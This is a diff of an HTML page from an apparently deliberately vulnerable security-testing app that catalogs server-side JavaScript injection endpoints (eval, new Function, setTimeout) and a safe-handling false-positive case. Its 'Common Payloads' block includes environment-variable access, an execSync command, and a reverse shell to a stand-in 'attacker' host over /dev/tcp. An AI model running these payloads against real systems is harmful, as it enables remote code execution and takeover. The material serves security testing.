@@ -3,34 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <title>Server-Side JavaScript Injection - HIVE</title>
-    <style>
-        body { font-family: system-ui, sans-serif; max-width: 800px; margin: 40px auto; padding: 0 20px; }
-        a { color: #0066cc; }
-        .back { margin-bottom: 20px; }
-        .vuln { color: #c00; }
-        .safe { color: #080; }
-        code { background: #f5f5f5; padding: 2px 6px; border-radius: 3px; }
-    </style>
+    <link rel="stylesheet" href="/static/css/hive.css">
 </head>
 <body>
-    <div class="back"><a href="/vulns/injection/">&larr; Back to Injection</a></div>
-    <h1>Server-Side JavaScript Injection</h1>
-    <p>Code injection in Node.js/server-side JavaScript applications.</p>
+    <div class="container">
+        <div class="back"><a href="..">&larr; Back</a></div>
+        <h1>Server-Side JavaScript Injection</h1>
+        <p>Code injection in Node.js/server-side JavaScript applications.</p>
 
-    <h2 class="vuln">Dangerous Functions</h2>
-    <ul>
-        <li><a href="/vulns/injection/ssjs/eval?code=1%2B1">eval() Injection</a> - Direct code execution</li>
-        <li><a href="/vulns/injection/ssjs/function?body=return%2042">Function Constructor</a> - new Function()</li>
-        <li><a href="/vulns/injection/ssjs/settimeout?callback=console.log('hi')">setTimeout String</a> - Delayed execution</li>
-    </ul>
+        <h2 class="vuln">Dangerous Functions</h2>
+        <ul>
+            <li><a href="/vulns/injection/ssjs/eval?code=1%2B1">eval() Injection</a> - Direct code execution</li>
+            <li><a href="/vulns/injection/ssjs/function?body=return%2042">Function Constructor</a> - new Function()</li>
+            <li><a href="/vulns/injection/ssjs/settimeout?callback=console.log('hi')">setTimeout String</a> - Delayed execution</li>
+        </ul>
 
-    <h2 class="safe">False Positives</h2>
-    <ul>
-        <li><a href="/vulns/injection/ssjs/fp/safe">Safe Handling</a> - Input as data only</li>
-    </ul>
+        <h2 class="safe">False Positives</h2>
+        <ul>
+            <li><a href="/vulns/injection/ssjs/fp/safe">Safe Handling</a> - Input as data only</li>
+        </ul>
 
-    <h2>Common Payloads</h2>
-    <pre>
+        <h2>Common Payloads</h2>
+        <pre>
 // Environment access
 process.env
 
@@ -42,6 +36,7 @@ require('child_process').execSync('id').toString()
 
 // Reverse shell
 require('child_process').exec('bash -i >& /dev/tcp/attacker/4444 0>&1')
-    </pre>
+        </pre>
+    </div>
 </body>
 </html>
